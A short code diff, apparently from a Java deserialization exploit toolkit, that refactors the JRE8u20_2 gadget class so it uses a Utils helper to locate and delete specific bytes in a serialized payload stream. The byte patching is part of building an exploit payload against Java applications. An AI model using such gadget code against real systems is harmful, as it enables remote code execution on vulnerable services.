@@ -1,6 +1,5 @@
 package com.qi4l.JYso.gadgets;
 
-import com.qi4l.JYso.gadgets.utils.ByteUtil;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.Reflections;
 import com.qi4l.JYso.gadgets.utils.Serializer;
@@ -64,9 +63,9 @@ public class JRE8u20_2 implements ObjectPayload<Object> {
 
         byte[] shoudReplace = new byte[]{0x78, 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78, 0x71};
 
-        int i = ByteUtil.getSubarrayIndex(ser, shoudReplace);
-        ser = ByteUtil.deleteAt(ser, i); // delete 0x78
-        ser = ByteUtil.deleteAt(ser, i); // delete 0x70
+        int i = com.qi4l.JYso.gadgets.utils.Utils.getSubarrayIndex(ser, shoudReplace);
+        ser = com.qi4l.JYso.gadgets.utils.Utils.deleteAt(ser, i); // delete 0x78
+        ser = com.qi4l.JYso.gadgets.utils.Utils.deleteAt(ser, i); // delete 0x70
 
         return ser;
     }
